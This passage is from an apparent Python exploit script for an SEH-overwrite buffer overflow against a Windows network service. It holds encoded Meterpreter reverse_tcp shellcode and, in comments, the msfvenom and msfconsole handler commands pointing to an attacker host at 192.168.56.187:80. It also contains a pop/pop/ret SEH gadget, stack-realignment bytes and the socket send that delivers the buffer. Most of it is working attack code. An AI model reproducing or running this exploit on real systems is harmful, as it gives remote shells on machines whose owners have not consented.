    shellcode = (
        #  BufferRegister=ECX with alpha_mixed fixes the first several byte preamble that's in the non-ascii range, and tells the shellcode what register holds the address of the shellcode's absolute position
        # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.187 LPORT=80 EXITFUNC=seh BufferRegister=ecx -b "\x00\x2e" -e x86/alpha_mixed -f c
        # sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; run"
        "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
        "\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41"
        "\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41"
        "\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x4b\x58\x6c"
        "\x4f\x75\x50\x53\x30\x33\x30\x51\x70\x45\x61\x78\x52\x32"
        "\x44\x4c\x4b\x66\x32\x74\x70\x6e\x6b\x36\x32\x34\x4c\x6c"
        "\x49\x7a\x45\x6c\x4b\x43\x62\x55\x44\x64\x4f\x4d\x67\x50"
        "\x4a\x67\x56\x76\x51\x59\x6f\x4e\x6b\x74\x32\x66\x48\x70"
        "\x31\x79\x50\x6e\x4c\x75\x6c\x75\x31\x43\x4c\x53\x32\x56"
        "\x4c\x51\x30\x4f\x31\x48\x4f\x54\x4d\x45\x51\x4b\x77\x63"
        "\x79\x31\x65\x7a\x4f\x72\x72\x76\x37\x6c\x4b\x53\x62\x32"
        "\x30\x6c\x4b\x43\x72\x57\x4c\x53\x31\x78\x50\x6e\x6b\x67"
        "\x30\x62\x58\x4d\x55\x79\x50\x32\x54\x30\x4c\x53\x31\x58"
        "\x50\x4e\x6b\x73\x68\x61\x30\x6e\x6b\x72\x68\x67\x68\x33"
        "\x31\x7a\x73\x70\x50\x4c\x45\x48\x49\x54\x34\x37\x4c\x36"
        "\x51\x69\x6f\x42\x69\x6c\x4b\x47\x44\x4c\x4b\x35\x51\x58"
        "\x56\x34\x71\x79\x50\x4c\x6c\x4f\x31\x68\x4f\x36\x6d\x67"
        "\x71\x5a\x67\x30\x38\x59\x70\x51\x65\x6a\x54\x54\x43\x33"
        "\x4d\x39\x68\x65\x6b\x63\x4d\x47\x54\x53\x45\x39\x70\x43"
        "\x68\x4e\x6b\x76\x38\x35\x74\x63\x31\x59\x43\x43\x56\x6e"
        "\x6b\x34\x4c\x32\x6b\x4c\x4b\x36\x38\x37\x6c\x65\x51\x49"
        "\x43\x4e\x6b\x53\x34\x6c\x4b\x53\x31\x78\x50\x4b\x39\x52"
        "\x64\x76\x44\x37\x54\x51\x4b\x31\x4b\x75\x31\x52\x79\x71"
        "\x4a\x53\x61\x79\x6f\x49\x70\x50\x58\x33\x6f\x72\x7a\x4e"
        "\x6b\x75\x42\x6b\x59\x6f\x70\x69\x6f\x69\x6f\x4b\x4f\x61"
        "\x4d\x72\x48\x37\x43\x47\x42\x43\x30\x57\x70\x55\x38\x62"
        "\x57\x31\x63\x46\x52\x43\x6f\x31\x44\x75\x38\x42\x6c\x71"
        "\x67\x46\x46\x53\x37\x4e\x69\x78\x68\x79\x6f\x4e\x30\x48"
        "\x38\x6c\x50\x73\x31\x53\x30\x43\x30\x74\x69\x79\x54\x72"
        "\x74\x32\x70\x51\x78\x75\x79\x6d\x50\x30\x6b\x75\x50\x6b"
        "\x4f\x58\x55\x31\x7a\x46\x6a\x45\x38\x49\x50\x6c\x68\x74"
        "\x78\x4d\x6b\x50\x68\x35\x52\x55\x50\x57\x70\x56\x30\x6f"
        "\x79\x38\x66\x70\x50\x36\x30\x50\x50\x76\x30\x57\x30\x62"
        "\x70\x33\x70\x50\x50\x45\x38\x4b\x5a\x74\x4f\x59\x4f\x6d"
        "\x30\x4b\x4f\x68\x55\x6a\x37\x30\x6a\x72\x30\x33\x66\x73"
        "\x67\x63\x58\x6d\x49\x4e\x45\x62\x54\x33\x51\x39\x6f\x78"
        "\x55\x6e\x65\x6f\x30\x44\x34\x64\x4a\x6b\x4f\x52\x6e\x36"
        "\x68\x34\x35\x4a\x4c\x6d\x38\x72\x47\x73\x30\x73\x30\x65"
        "\x50\x42\x4a\x57\x70\x32\x4a\x47\x74\x72\x76\x51\x47\x72"
        "\x48\x37\x72\x79\x49\x58\x48\x31\x4f\x6b\x4f\x68\x55\x4c"
        "\x43\x4c\x38\x43\x30\x63\x4e\x34\x76\x4e\x6b\x34\x76\x72"
        "\x4a\x71\x50\x55\x38\x47\x70\x42\x30\x45\x50\x37\x70\x30"
        "\x56\x53\x5a\x43\x30\x75\x38\x42\x78\x59\x34\x32\x73\x6d"
        "\x35\x6b\x4f\x5a\x75\x6f\x63\x36\x33\x32\x4a\x63\x30\x76"
        "\x36\x43\x63\x70\x57\x52\x48\x66\x62\x4a\x79\x4a\x68\x53"
        "\x6f\x79\x6f\x58\x55\x6f\x73\x6c\x38\x53\x30\x51\x6d\x61"
        "\x38\x52\x78\x43\x58\x35\x50\x71\x50\x55\x50\x65\x50\x72"
        "\x4a\x77\x70\x46\x30\x43\x58\x54\x4b\x64\x6f\x74\x4f\x36"
        "\x50\x39\x6f\x58\x55\x30\x57\x32\x48\x54\x35\x50\x6e\x70"
        "\x4d\x71\x71\x69\x6f\x38\x55\x51\x4e\x31\x4e\x79\x6f\x64"
        "\x4c\x45\x74\x66\x6f\x6e\x65\x62\x50\x39\x6f\x4b\x4f\x59"
        "\x6f\x49\x79\x4f\x6b\x4b\x4f\x59\x6f\x69\x6f\x76\x61\x6b"
        "\x73\x47\x59\x48\x46\x42\x55\x6a\x61\x68\x43\x4d\x6b\x39"
        "\x6e\x46\x6e\x76\x52\x6b\x5a\x61\x7a\x45\x50\x66\x33\x69"
        "\x6f\x69\x45\x43\x5a\x55\x50\x78\x43\x41\x41" # 767
    )
    slack1 = "\x41" *( SEH_offset - sum(iter([len(x) for x in [
        nopsled,
        shellcode
    ]])))
    SEH =  packlatin("<L", 0x62501335) # 0x62501335: pop ecx ; pop eax ; ret ; 
    stage1 = (
        ### Realign ESP to end of stack
         "\x42\x54\x58\x66\x05\x7f\x13\x04\x14\x40\x50\x5c"      # 42 inc edx; 54 push esp; 58 pop eax; 66057F13 add ax,0x137f; 0414 add al,0x14; 40 inc eax; 50 push eax; 5C pop esp # 12 bytes

        ## realign eax to near beginning of buffer and push eax.
        "\x48\x66\x2d\x7f\x0d\x2c\x50\x50\x59\x51"      # 48 dec eax; 662D7F0D sub ax,0xd7f; 2C50 sub al,0x50; 50 push eax; 59 pop ecx; 51 push ecx # 10 bytes

        ## make second to last dword on stack \xc3 (ret)
        "\x68\x02\x02\x02\x7f\x58\x05\x42\x42\x40\x44\x50"      # 680202027F push dword 0x7f020202; 58 pop eax; 0542424044 add eax,0x44404242; 50 push eax # 12 bytes

        ## increment esp by four so stack points at the pointer to beginning of buffer.
        "\x44\x44\x44\x44"      # 44 inc esp; 44 inc esp; 44 inc esp; 44 inc esp # 4 bytes
    )
    slack2 = "\x42" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        nopsled,
        shellcode,
        slack1,
        SEH,
        stage1,
        ender
    ]])))
    buf = f"{opcode}{nopsled}{shellcode}{slack1}{SEH}{stage1}{slack2}{ender}"

    sock = sender(ip, port,buf)
    sock.recv(1024)  ## clear the airwaves
    sock.close()  

# def unpacklatin(fmt, inp):
#         return unpack(fmt, inp.encode('latin-1'))[0]

# def uniesc_to_bytestr(instring):
#     r""" '\\x58\\x59\\x5a\\xa0' -> 'XYZ\xa0' 
#         hexstrings in from cli, ex., argparse   """
#     return bytes(instring, 'utf-8').decode("unicode_escape")

# def bytestr_to_long(inbstr):
#     r""" 'XYZ\xa0' -> 2690275672 """
#     return unpack("I",bytes(inbstr,'latin-1'))[0]

# def long_to_bytestr(inlong):
#     r""" 2690275672 -> 'XYZ\xa0' """
#     return pack("<L", inlong).decode('latin-1')

# def octalstring_to_bytestr_pad(inoct):
#     r""" "0x200" -> '\x00\x02\x00\x00' (le) 
#         for the --va + --addbase scenario 
#         pad with \x00 to dword size bytes """
#     return pack("<L", (int(inoct,16))).decode('latin-1')

# def octalstring_to_bytestr_nopad(inoct):
#     r""" "0x200" -> '\x00\x02' (le) 
#         for the --va only scenario 
#         no padding with \x00 to dword size bytes """
#     octstr = inoct[2:]
#     if len(octstr) % 2 == 1:
#         octstr = f"0{octstr}"
#     return ''.join([chr(int(octstr[x:x+2],16)) for x in range(0,len(octstr),2)][::-1])

if __name__=="__main__":
    main()

